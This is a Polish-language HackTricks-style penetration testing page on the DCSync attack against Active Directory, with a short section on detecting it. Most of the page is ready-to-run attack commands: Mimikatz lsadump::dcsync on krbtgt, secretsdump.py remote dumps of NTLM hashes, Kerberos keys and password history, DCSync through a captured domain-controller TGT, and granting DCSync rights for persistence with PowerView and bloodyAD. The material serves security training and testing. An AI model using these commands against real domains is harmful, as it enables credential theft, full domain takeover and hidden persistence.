# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie następujących uprawnień w domenie: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** oraz **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Ważne uwagi dotyczące DCSync:**

- **Atak DCSync symuluje działanie kontrolera domeny i żąda od innych kontrolerów domeny replikacji informacji** za pomocą protokołu Directory Replication Service Remote Protocol (MS-DRSR). Ponieważ MS-DRSR jest prawidłową i niezbędną funkcją Active Directory, nie można go wyłączyć ani dezaktywować.
- Domyślnie wymagane uprawnienia mają tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers**.
- W praktyce **pełny DCSync** wymaga uprawnień **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** w kontekście nazewnictwa domeny. Uprawnienie `DS-Replication-Get-Changes-In-Filtered-Set` jest często delegowane razem z nimi, ale samodzielnie ma większe znaczenie przy synchronizowaniu **poufnych atrybutów / atrybutów filtrowanych przez RODC** (na przykład sekretów w stylu starszego LAPS) niż przy pełnym zrzucie krbtgt.<sup>[[2]](#references)</sup>
- Jeśli hasła niektórych kont są przechowywane z użyciem szyfrowania odwracalnego, Mimikatz umożliwia zwrócenie hasła w postaci jawnego tekstu.

### Enumeracja

Sprawdź, kto ma te uprawnienia, używając `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Jeśli chcesz skupić się na **niestandardowych podmiotach** z uprawnieniami DCSync, odfiltruj wbudowane grupy z uprawnieniami do replikacji i sprawdź tylko nieoczekiwane podmioty zabezpieczeń:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Eksploatacja lokalna

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Eksploatacja zdalna

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktyczne przykłady o ograniczonym zakresie:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync przy użyciu przechwyconego TGT komputera DC (ccache)

Podczas analizy usługi na kontrolerze domeny odróżnij jej lokalną tożsamość od tożsamości używanej w sieci. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), że konta wirtualne SQL Server (`NT SERVICE\...`) uzyskują dostęp do zasobów sieciowych jako konto komputera hosta. Na kontrolerze domeny może to sprawić, że konto komputera DC będzie istotne przy sprawdzaniu uprawnień do replikacji, ale sam foothold w usłudze nie potwierdza, że można wyeksportować TGT komputera ani użyć go do uwierzytelnienia DCSync. Zanim uznasz to za możliwą ścieżkę, zweryfikuj rzeczywistą tożsamość usługi, kontekst uwierzytelniania wychodzącego, dostępny bilet lub poświadczenia oraz efektywne uprawnienia do replikacji.

W scenariuszach z unconstrained delegation w trybie eksportu możesz przechwycić TGT komputera kontrolera domeny (np. `DC1$@DOMAIN` dla `krbtgt@DOMAIN`). Następnie możesz użyć tego ccache, aby uwierzytelnić się jako DC i wykonać DCSync bez hasła.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Uwagi operacyjne:

- **Ścieżka Kerberos w Impacket najpierw korzysta z SMB**, a dopiero potem wykonuje wywołanie DRSUAPI. Jeśli środowisko wymusza **weryfikację nazwy docelowej SPN**, pełny zrzut może się nie powieść: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- W takim przypadku najpierw zażądaj biletu usługi **`cifs/<dc>`** dla docelowego kontrolera domeny albo użyj **`-just-dc-user`**, aby od razu uzyskać dane potrzebnego konta.
- Gdy masz tylko niższe uprawnienia do replikacji, synchronizacja w stylu LDAP/DirSync nadal może ujawnić atrybuty **poufne** lub **filtrowane przez RODC** (na przykład starszy atrybut `ms-Mcs-AdmPwd`) bez pełnej replikacji krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami jawnym tekstem z NTDS dla kont, na których włączono [**szyfrowanie odwracalne**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Użytkowników z włączonym szyfrowaniem odwracalnym można znaleźć za pomocą

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Utrzymywanie dostępu

Jeśli jesteś administratorem domeny, możesz nadać te uprawnienia dowolnemu użytkownikowi za pomocą PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Operatorzy Linuksa mogą zrobić to samo za pomocą `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Następnie możesz **sprawdzić, czy użytkownikowi poprawnie przypisano** 3 uprawnienia, szukając ich w wynikach (nazwy uprawnień powinny być widoczne w polu „ObjectType”):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Ograniczanie skutków

- Security Event ID 4662 (musi być włączona Audit Policy dla obiektu) – Wykonano operację na obiekcie<sup>[[4]](#references)</sup>
- Security Event ID 5136 (musi być włączona Audit Policy dla obiektu) – Zmodyfikowano obiekt usługi katalogowej
- Security Event ID 4670 (musi być włączona Audit Policy dla obiektu) – Zmieniono uprawnienia do obiektu
- AD ACL Scanner – Twórz i porównuj raporty ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket — dziennik zmian](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: wykorzystanie replikacji Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: zrzucanie hashy haseł z kontrolera domeny](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — dane logowania SYSVOL → ukierunkowany Kerberoast → nieograniczona delegacja → DCSync w celu uzyskania DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
